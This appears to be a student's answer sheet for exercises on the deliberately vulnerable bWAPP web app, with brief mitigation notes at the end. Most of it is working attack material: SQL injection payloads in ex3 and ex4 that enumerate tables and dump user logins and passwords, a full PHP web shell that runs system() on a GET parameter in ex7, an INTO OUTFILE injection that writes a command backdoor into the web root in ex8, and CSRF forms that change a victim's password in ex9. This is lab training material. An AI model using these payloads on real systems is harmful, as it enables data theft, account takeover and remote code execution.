#################################################################

ex3:
a.         ll' or 1=1 -- -
b.         ll' order by 8 -- -
c.         ll' union select 1,2,3,4,5,6,7-- -
d.         ll' union  select 1,current_user(), schema(), 4, 5, 6, 7 -- -
e.         ll' union select 1,DATABASE(),3,4,5,6,7-- -
f.         ll' UNION SELECT 1, table_name, 3, 4, 5, 6, 7 FROM information_schema.tables-- -
g.         ll' UNION SELECT table_name, column_name, 3,4,5,6,7 FROM information_schema.columns where table_name = "users" -- -
h.         ll' UNION SELECT 1, login, 3,password,5,6,7 FROM users-- -

#################################################################

ex4:
a. movie=11 UNION SELECT 1, group_concat(Title),3, 4, 5, 6, 7 FROM bWAPP.movies
b. movie=1 order by 8-- 
c. movie=11 and 1=0 UNION SELECT 1,2,3,4,5,6,7-- 
d. movie=1 and 1=0 UNION SELECT 1,current_user(),schema(),4,5,6,7--
e. movie=1 and 1=0 UNION SELECT 1,database(),3,4,5,6,7--
f. movie=1 and 1=0  UNION SELECT 1,2, group_concat(table_name),4,5,6,7 FROM information_schema.tables
g. movie=1 and 1=0  UNION SELECT 1,2, group_concat(column_name),4,5,6,7 FROM information_schema.columns where table_name = "users" 
h. movie=1 and 1=0 UNION SELECT 1, group_concat(login), group_concat(password), 4, 5, 6, 7 FROM bWAPP.users

#################################################################

ex5:
search: it will be the same, ther's no real difference between get and post. it onlly a matter of which side is the asking side...
select: no url is shown! but you can still inject, although it will be harder since you can't see the url.

#################################################################

ex6:
ajax is pretty much the same, it seats on the client side but the queries are the same.
(a cool thing you can do with ajax is intercept the packets with burp and see all the reply the client gets)

#################################################################

ex7:
followed this guide:  (might not work on docker, it worked on a docker on port 8083 and didnt work on 8080)   
https://cylab.be/blog/255/web-shells-and-the-dangers-of-unrestricted-file-upload?accept-cookies=1

for the shel script i put this one instead the huge one in the guide:

    <html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
</html>
    

#################################################################

ex8:
****** note! this exercise onlly works on bwapp vm, not on the docker. ******

in get search we put the following query:
'union select 1,"<?=`$_GET[_]`?>",3,4,5,6,7 INTO OUTFILE "/var/www/bWAPP/images/file.php"-- -
then we open a broser and in the url go to that file, and add the command in the end:
localhost/bWAPP/images/file.php/?_=ls


#################################################################

ex9:
for low level:
create html file and put the html form in it (from the source code) and change it a little so when you click 
the botton it will put the new password automatically. after the small modifications it looks like this:
<form action="/csrf_1.php" method="GET">

        <input type="hidden" value="new_pass" id="password_new" name="password_new"></p> 

        <input type="hidden" value="new_pass" id="password_conf" name="password_conf"></p>

        <button type="submit" name="action" value="give me my money!">give me my money</button>

    </form>

then we upload the file in the "Unrestricted File Upload" section in bwapp and click the "give me my money!" botton to activate it.
and hop! we changed the user's password (and directed him to another page) with him doing nothing but press a botton!
this is how cross site request forgery attack works!

for medium/high level same thing just add the field for current password:

<form action="/csrf_1.php" method="GET">


        <input type="password" id="password_curr" name="password_curr"></p>

        <input type="hidden" value="bug" id="password_new" name="password_new"></p>

        <input type="hidden" value="bug" id="password_conf" name="password_conf"></p>

        <button type="submit" name="action" value="give me money!">give me my money</button>

    </form>

#################################################################
ex11:
a. sql inection... solotion: sanitize.
b. injection of java script code that will be executed. solution: sanitize of js tags and more.
c. injection of php code that will be executed when they include it in the next line. solution: sanitize of php files.
d. sql injection is not possible because the login might be sanitized befor entered to the session. 
   but request forgery (the username) is possible.
   solution: use csrf token to make sure that the real user submit the request and prevent request forgery.